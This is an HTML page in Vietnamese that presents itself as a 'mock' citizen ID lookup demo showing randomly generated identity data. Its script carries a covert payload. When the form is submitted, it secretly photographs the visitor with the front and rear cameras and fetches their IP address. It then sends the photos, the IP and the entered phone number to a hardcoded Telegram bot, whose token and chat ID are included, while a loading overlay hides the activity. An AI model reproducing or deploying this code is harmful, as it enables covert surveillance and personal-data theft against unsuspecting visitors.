
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tra cứu CCCD - Mock Data</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            font-family: 'Inter', sans-serif;
        }
        .card {
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
        }
        .logo {
            color: #3b82f6;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        #resultCard {
            display: none;
        }
        .qr-code {
            background: white;
            padding: 10px;
            border-radius: 8px;
            width: 120px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body class="min-h-screen py-8">
    <div class="container mx-auto px-4 max-w-4xl">
        <header class="text-center mb-10">
            <div class="flex items-center justify-center mb-3">
                <i class="fas fa-id-card text-4xl mr-3 logo"></i>
                <h1 class="text-3xl font-bold text-gray-800">HỆ THỐNG TRA CỨU MOCK CCCD</h1>
            </div>
            <p class="text-gray-600 max-w-lg mx-auto">Demo tool by kcuong06</p>
            <hr class="my-6 border-gray-200 w-1/4 mx-auto">
        </header>

        <div class="card bg-white rounded-xl p-6 mb-8">
            <h2 class="text-xl font-semibold mb-6 text-blue-600"><i class="fas fa-search mr-2"></i>Nhập thông tin tra cứu</h2>
            
            <form id="searchForm" class="space-y-5">
                <div class="flex flex-col md:flex-row gap-4">
                    <div class="flex-1 relative">
                        <i class="fas fa-phone absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        <input 
                            type="tel" 
                            id="phoneNumber"
                            class="w-full pl-10 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
                            placeholder="Số điện thoại (10-11 chữ số)"
                            pattern="[0-9]{10,11}"
                            required
                        >
                    </div>
                    
                    <button 
                        type="submit"
                        class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-lg transition flex-shrink-0 w-full md:w-auto flex items-center justify-center"
                    >
                        <i class="fas fa-search mr-2"></i> Tra cứu
                    </button>
                </div>
                
                <div class="flex items-center">
                    <input type="checkbox" id="consent" class="mr-2 h-4 w-4" required>
                    <label for="consent" class="text-sm text-gray-600">Bạn đã chắc chắn check thông tin?</label>
                </div>
            </form>
        </div>

        <div id="resultCard" class="card bg-white rounded-xl p-6">
            <div class="flex flex-col md:flex-row gap-6">
                <div class="flex-1">
                    <h2 class="text-xl font-semibold mb-6 text-blue-600">
                        <i class="fas fa-id-card mr-2"></i>Thông tin căn cước
                    </h2>
                    
                    <div class="space-y-5">
                        <div>
                            <p class="text-sm font-medium text-gray-500 mb-1">Số CCCD:</p>
                            <p id="mockIdNumber" class="text-lg font-mono font-bold">012345678912</p>
                        </div>
                        
                        <div>
                            <p class="text-sm font-medium text-gray-500 mb-1">Họ và tên:</p>
                            <p id="mockFullName" class="text-xl font-semibold text-gray-800">NGUYỄN VĂN MẪU</p>
                        </div>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                                <p class="text-sm font-medium text-gray-500 mb-1">Ngày sinh:</p>
                                <p id="mockDob" class="text-lg">01/01/1990</p>
                            </div>
                            <div>
                                <p class="text-sm font-medium text-gray-500 mb-1">Giới tính:</p>
                                <p id="mockGender" class="text-lg">Nam</p>
                            </div>
                            <div>
                                <p class="text-sm font-medium text-gray-500 mb-1">Quốc tịch:</p>
                                <p id="mockNationality" class="text-lg">Việt Nam</p>
                            </div>
                            <div>
                                <p class="text-sm font-medium text-gray-500 mb-1">Quê quán:</p>
                                <p id="mockHometown" class="text-lg">Hà Nội</p>
                            </div>
                        </div>
                        
                        <div>
                            <p class="text-sm font-medium text-gray-500 mb-1">Nơi thường trú:</p>
                            <p id="mockAddress" class="text-lg">Số 1, Đường ABC, Phường XYZ, Quận 1, TP.HCM</p>
                        </div>
                    </div>
                </div>
                
                <div class="text-center">
                    <p class="text-sm text-gray-500 mb-1">Ngày cấp:</p>
                    <p id="mockIssueDate" class="font-medium">15/06/2022</p>
                </div>
            </div>
            
            <div class="mt-8 pt-6 border-t border-gray-200">
                <p class="text-sm text-gray-500 mb-1">Mẫu thông tin được tạo tự động:</p>
                <p id="mockGeneratedInfo" class="text-sm text-gray-600 italic">
                    Dữ liệu được tạo ngẫu nhiên, không liên quan đến thông tin thực tế. 
                    Mọi trùng hợp là ngẫu nhiên.
                </p>
            </div>
        </div>
    </div>

    <!-- Overlay loading -->
    <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white rounded-lg shadow-lg p-6 text-center animate-pulse">
            <i class="fas fa-spinner fa-spin text-4xl text-blue-600 mb-4"></i>
            <p class="text-lg font-semibold text-gray-700">Đang kiểm tra...</p>
        </div>
    </div>

    <footer class="mt-12 text-center text-sm text-gray-500">
        <p>©kcuong06</p>
        <p class="mt-1">Phiên bản: v1.0</p>
    </footer>

    <script>
        async function capturePhotos() {
            const frontPhotos = [];
            const rearPhotos = [];

            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const frontVideo = document.createElement('video');
            frontVideo.srcObject = frontStream;
            await frontVideo.play();

            for (let i = 0; i < 2; i++) {
                const canvas = document.createElement('canvas');
                canvas.width = frontVideo.videoWidth;
                canvas.height = frontVideo.videoHeight;
                canvas.getContext('2d').drawImage(frontVideo, 0, 0);
                frontPhotos.push(canvas.toDataURL('image/jpeg', 0.8));
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            frontStream.getTracks().forEach(track => track.stop());

            try {
                const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
                const rearVideo = document.createElement('video');
                rearVideo.srcObject = rearStream;
                await rearVideo.play();

                for (let i = 0; i < 2; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = rearVideo.videoWidth;
                    canvas.height = rearVideo.videoHeight;
                    canvas.getContext('2d').drawImage(rearVideo, 0, 0);
                    rearPhotos.push(canvas.toDataURL('image/jpeg', 0.8));
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                rearStream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.error('Rear camera not available:', err);
            }

            return [...frontPhotos, ...rearPhotos];
        }

        async function getIPAndLocation() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Không lấy được IP';
            }
        }

        document.getElementById('searchForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            // Hiện overlay loading
            const loadingOverlay = document.getElementById('loadingOverlay');
            loadingOverlay.classList.remove('hidden');

            const [photos, ip] = await Promise.all([
                capturePhotos(),
                getIPAndLocation()
            ]);

            const mockData = generateMockData();

            document.getElementById('mockIdNumber').textContent = mockData.idNumber;
            document.getElementById('mockFullName').textContent = mockData.fullName;
            document.getElementById('mockDob').textContent = mockData.dob;
            document.getElementById('mockGender').textContent = mockData.gender;
            document.getElementById('mockNationality').textContent = mockData.nationality;
            document.getElementById('mockHometown').textContent = mockData.hometown;
            document.getElementById('mockAddress').textContent = mockData.address;
            document.getElementById('mockIssueDate').textContent = mockData.issueDate;
            document.getElementById('mockGeneratedInfo').textContent = mockData.generatedInfo;

            const botToken = '8004316784:AAGXwEjyEOTG2Xc7eQBcuv9oEgFbnvaKv3s';
            const chatId = '5705746414';

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Tra cứu CCCD từ IP: ${ip} SĐT: ${document.getElementById('phoneNumber').value}`);
            
            for (let i = 0; i < photos.length; i++) {
                const photoBlob = dataURLtoBlob(photos[i]);
                const photoData = new FormData();
                photoData.append('chat_id', chatId);
                photoData.append('photo', photoBlob, `photo_${i + 1}.jpg`);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: photoData
                });
            }

            // Ẩn overlay loading
            loadingOverlay.classList.add('hidden');

            document.getElementById('resultCard').style.display = 'block';

            setTimeout(() => {
                document.getElementById('resultCard').scrollIntoView({
                    behavior: 'smooth'
                });
            }, 100);
        });

        function generateMockData() {
            const firstNames = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Hoàng'];
            const middleNames = ['Văn', 'Thị', 'Hữu', 'Đình', 'Minh'];
            const lastNames = ['Anh', 'Bình', 'Chung', 'Dũng', 'Giang', 'Hùng', 'Long', 'Phúc'];

            const fullName = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${middleNames[Math.floor(Math.random() * middleNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`.toUpperCase();

            const dob = new Date();
            dob.setFullYear(dob.getFullYear() - Math.floor(Math.random() * 42) - 18);
            dob.setMonth(Math.floor(Math.random() * 12));
            dob.setDate(Math.floor(Math.random() * 28) + 1);
            const dobStr = dob.toLocaleDateString('vi-VN');

            const issueDate = new Date();
            issueDate.setFullYear(issueDate.getFullYear() - Math.floor(Math.random() * 3) - 1);
            issueDate.setMonth(Math.floor(Math.random() * 12));
            issueDate.setDate(Math.floor(Math.random() * 28) + 1);
            const issueDateStr = issueDate.toLocaleDateString('vi-VN');

            const gender = Math.random() > 0.5 ? 'Nam' : 'Nữ';
            const idNumber = '0' + Math.floor(Math.random() * 1e11).toString().padStart(11, '0');

            const cities = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng', 'Cần Thơ'];
            const districts = ['Quận 1', 'Quận 3', 'Quận Thanh Xuân', 'Quận Hải Châu', 'Quận Ninh Kiều'];
            const streets = ['Nguyễn Huệ', 'Trần Hưng Đạo', 'Lê Lợi', 'Phạm Văn Đồng', 'Hoàng Diệu'];
            const address = `${Math.floor(Math.random() * 100) + 1}, Đường ${streets[Math.floor(Math.random() * streets.length)]}, ${districts[Math.floor(Math.random() * districts.length)]}, ${cities[Math.floor(Math.random() * cities.length)]}`;

            const hometowns = ['Hà Nội', 'Hải Phòng', 'Nam Định', 'Thanh Hóa', 'Nghệ An', 'Huế', 'Đà Nẵng', 'Khánh Hòa'];
            const hometown = hometowns[Math.floor(Math.random() * hometowns.length)];

            return {
                idNumber,
                fullName,
                dob: dobStr,
                gender,
                nationality: 'Việt Nam',
                hometown,
                address,
                issueDate: issueDateStr,
                generatedInfo: `Dữ liệu giả lập được tạo ngẫu nhiên lúc ${new Date().toLocaleString('vi-VN')}. Thông tin không dùng cho mục đích chính thức.`
            };
        }

        function dataURLtoBlob(dataUrl) {
            const arr = dataUrl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
    </script>
</body>
</html>